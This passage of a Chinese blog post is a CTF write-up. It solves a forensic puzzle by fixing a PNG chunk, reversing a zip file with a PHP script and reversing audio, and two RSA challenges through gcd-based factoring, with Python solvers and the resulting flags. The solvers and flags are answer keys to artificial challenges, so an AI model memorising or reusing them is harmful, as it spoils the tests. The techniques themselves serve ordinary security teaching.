+<li>找到数据包中的ZIP导出为分组字节流保存为zip 文件</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-214128@2x.png" alt="WX20210406-214128@2x" style="zoom:33%;">
+
+<ul>
+<li>得到一个文件和一张图片</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-214353@2x.png" alt="WX20210406-214353@2x" style="zoom:33%;">
+
+<ul>
+<li>图片只能看到一部分说明chunk被破坏过用010打开可以发现chunk4长度很奇怪应该被改过</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-214609@2x.png" alt="WX20210406-214609@2x" style="zoom:25%;">
+
+<ul>
+<li>将其改大可以恢复图片得到一串字符串</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-214757@2x.png" alt="WX20210406-214757@2x" style="zoom:25%;">
+
+<ul>
+<li>还有一个文件结合信条这部电影讲述的就是倒过来的世界所以flag文件可能就是倒过来的文件。</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-214951@2x.png" alt="WX20210406-214951@2x" style="zoom:25%;">
+
+<ul>
+<li>可以看到文件结束是KP可能是PK的倒置，我们写个脚本将其倒置回来：</li>
+</ul>
+<pre><code class="php">&lt;?php 
+$a = file_get_contents(&#39;flag&#39;);
+file_put_contents(&quot;flag.zip&quot;,strrev($a));
+?&gt;</code></pre>
+<ul>
+<li>得到压缩包，压缩包密码就是图片中那串字符串。解压得到一个音频：</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-215238@2x.png" alt="WX20210406-215238@2x" style="zoom:25%;">
+
+<ul>
+<li>同样她也是倒放的音乐，咱们直接将其还原为正常的音乐，使用AU</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WX20210406-215422@2x.png" alt="WX20210406-215422@2x" style="zoom: 25%;">
+
+<ul>
+<li>倒置后网易云识别</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WechatIMG2034.jpeg" alt="WechatIMG2034" style="zoom:50%;">
+
+<ul>
+<li>评论区拿flag：</li>
+</ul>
+<img src=" https://goodcheerleung.gitee.io/macpic/WechatIMG87.jpeg" alt="WechatIMG87" style="zoom:33%;">
+
+<h2 id="数学很重要"><a href="#数学很重要" class="headerlink" title="数学很重要"></a>数学很重要</h2><p>需要分解n，得到p和q，才能拿到m，即flag</p>
+<p>在题目中有：<code>d = gmpy2.invert(e, p*(p-1)*(q-1))</code></p>
+<p>由此来推导模数n的分解：<br>$$<br>e * d = k * p * (p-1) * (q-1) + 1<br>$$</p>
+<p>$$<br>(e * d)^e = [k * p * (p-1) * (q-1) + 1]^e<br>$$</p>
+<p>$$<br>(e * d)^e = K * p + 1<br>$$</p>
+<p>$$<br>(e * d)^e % n = (K * p + 1) % n<br>$$</p>
+<p>$$<br>(e^e % n * d^e % n) % n = (K * p + 1) % n<br>$$</p>
+<p>$$<br>(e^e * d^e % n) % n = (K * p + 1) % n<br>$$</p>
+<p>$$<br>(e^e * d^e % n - 1) % n = (K * p) % n<br>$$</p>
+<p>$$<br>(e^e * d^e % n - 1) + t*n = K * p<br>$$</p>
+<p>$$<br>\frac{1}{K} * (e^e * d^e % n - 1) + \frac{t}{K}*n = p<br>$$</p>
+<p>$$<br>p = gcd((e^e * d^e % n - 1) % n, n)<br>$$</p>
+<p>$$<br>p = gcd((e^e * hint - 1) % n, n)<br>$$</p>
+<p>至此可以分解<code>n = p * p * q</code>，进而求出<code>m</code></p>
+<pre><code class="python">import gmpy2
+import libnum
+
+n = 1404864792885309108733640159316826506894236287548379939152849016743435983442699747921846125787195996033503870282773818470039914142701705451809138397049630572740639249477647644261254708528772540978792294225346035639261591427432057453936860038832354440430427494151140007167188185298912810715582637875006928402468687609650245843893636726667943630230916699610263246417106899540475644300775129490776223094431047266427439282518682724978986466077711523145747674327332051810519026006226118101950866725315377926329640394039034742537816196415220996830129516878556074570587486143579684121551028517709279020939236578960627017120428642424734081608822839438555638805913188881032407815526804750217289667978469999465893012019987646121081067553285784264938579036090518539835310642939403312387248525506990916704179728785567091817175793341264114889237623098808526580508172221259938132204690459668424325728699548951520597516996306695162612026923
+c = 1056621132858553337843799531931829780532909526893598349757065810082614861897005399538516022339385456921080981930134553531451997667616780694476473935635850906657287327947505250813121839115712839784961838878589687696392168999007259428943177170885096149257761111375426947276207008555385135699868532336069097451167698609146202623839343749042437332344304731408930972252319186875629139934202497457999728524999876011248799301721947182662277983045924969387711620125568428544081394563081888004751018879893766348092204921968270651820590342957624989796768741978229821705472159840676453778980085893882942690791813978120574188104366811115515943434915719899354094207665657376073518852691150218789684229024823845100939031274257318172046382806032216330957494501967155244691377918879968703887945579606252867891939345438276905409978552743142300094751510214632116779662364652019422074762160221347591144466572300812675526052926724548943468469723
+hint = 101794688716785217887960897945591243956989900037427176767666512559791995985108215779421011313213384758689708929722203071477840953013038647100924911493828188106127504843466854689586463951519895573419515062134362771498167243657486890676780200214663789335950289873729808283135837361560831229580803000690276177751767706193356374011845264745277604824551554541736615017289493676579496259064630875246918064858049304827949231835533001170204905788972411679518681180136352305431808979840858420025675441100205234779010351872551760580862818923553046506121627173411616799109177911982734522304097798381596915860520993100826264630451736911320052426159472868988436162344618566093403661349180934448297588983261629039054368903969451215957019928944985865422734016492501757272819066148585342366043951355199543153844023840418108988483011676230567828688205989252493165991940377092334291423942549979314542332470846061006424871389380351025361150311
+e = 0x10001
+
+p = gmpy2.gcd((pow(e, e) * hint - 1) % n, n)
+q = n // pow(p, 2)
+phi = p*(p-1)*(q-1)
+d = gmpy2.invert(e, phi)
+m = pow(c, d, n)
+print(libnum.n2s(int(m)))</code></pre>
+<ul>
+<li>flag</li>
+</ul>
+<pre><code>flag{Mathematics_is_very_important!}</code></pre><br>
+
+<h2 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h2><p>已知c、e、n1、n2，只要能够分解n1，就能够拿到flag</p>
+<p>在题目中n1和n2共用一个大质数p，所以n1和n2的最大公因数即为p，这样就能分解n1了</p>
+<pre><code class="python">import gmpy2
+import libnum
+
+e = 65537
+n1 = 19927995886914135335416406082647120895619334038709715664270614604151473749182691765161766917756826761209408429340053534661116540440455731883912107733536490306892185777306017692334819486621137392115368637822832208615896079869167332092773633150006570996052837028257313679389522817781164233607188350606757597836490056930318266077647703629309920052447748365274174530490094908252256551706625163193805930254664728936230312618043386165963458944225026036816776258340041222542638064896328642143272486093326421275373201421890802797828158807121957406664052135737278317985129996476960525575320786302386904366901933941877871977923
+n2 = 18891582332322922179757256935338383228362622765536723954262749118724360227437890613511811834258619933112000032816774390665802252670355559592889246899049387975273869584023100438870426265843757686044290924963164327025399130980205072334359825236874676865799829315906270559180981769846264222745663893031262917781276708151305378259082579089031371101323253330053986819164120184785001094503410745573822883437760154804937523455385157947633996347870180978374764506128842545299334183115882288528664242409706229889871455032394406814666870814759869179655535890356720047754561351306758635949531548031922969386197250253432717160713
+c = 13464724434881083014378360688491414344998156133411847847874051353940035862995104112542330206199732554180770508723141951625606376158124527681508374976085150535523169426812879850201999337951347258663163526945777620586135979743047015305904146804741356004618021619877806139998460893541631182931447449498967591502111403371136690476476964569301404706879044022446236796126968424261474149501366709514040581812492269780027443526915046387838380291031527967274048028552563236517463115042981801314702717397461735551656092225777678039402709019728332707310411968980746101194493745338399939010674127078293589259391068943187148009190
+
+p = gmpy2.gcd(n1, n2)
+q = n1//p
+phi = (p-1)*(q-1)
+
+d = gmpy2.invert(e, phi)
+m = pow(c, d, n1)
+print(libnum.n2s(int(m)))</code></pre>
+<ul>
+<li>flag</li>
+</ul>
+<pre><code>flag{u5e_the_s4me_p}</code></pre><p>## </p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/articles/hfctfunsetme.html" rel="prev" title="虎符unsetme Write Up">
+      <i class="fa fa-chevron-left"></i> 虎符unsetme Write Up
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB1"><span class="nav-number">1.</span> <span class="nav-text">WEB1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB2"><span class="nav-number">2.</span> <span class="nav-text">WEB2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB3"><span class="nav-number">3.</span> <span class="nav-text">WEB3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#隐藏的书"><span class="nav-number">4.</span> <span class="nav-text">隐藏的书</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#你能看到图片里的flag吗"><span class="nav-number">5.</span> <span class="nav-text">你能看到图片里的flag吗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#神秘的铃声"><span class="nav-number">6.</span> <span class="nav-text">神秘的铃声</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#神秘的网站"><span class="nav-number">7.</span> <span class="nav-text">神秘的网站</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数学很重要"><span class="nav-number">8.</span> <span class="nav-text">数学很重要</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyRSA"><span class="nav-number">9.</span> <span class="nav-text">easyRSA</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="XiaoLeung"
+      src="/header.jpg">
+  <p class="site-author-name" itemprop="name">XiaoLeung</p>
+  <div class="site-description" itemprop="description">随笔、分享、记录生活</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">74</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.redmango.top/" title="https://www.redmango.top/" rel="noopener" target="_blank">HhhM</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://l1near.top/" title="https://l1near.top/" rel="noopener" target="_blank">L1nearのspace</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.mrskye.cn/" title="https://www.mrskye.cn/" rel="noopener" target="_blank">SkYe's Blog</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.kawhi.xyz" title="https://www.kawhi.xyz" rel="noopener" target="_blank">kawhi</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn" rel="noopener" target="_blank">粤ICP备18132442号-1 </a>
+      <img src="/gongan.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" rel="noopener" target="_blank">粤公网安备 44011202000643号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">XiaoLeung</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">281k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:16</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=true&web_id=true"></script>
+  </div>
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
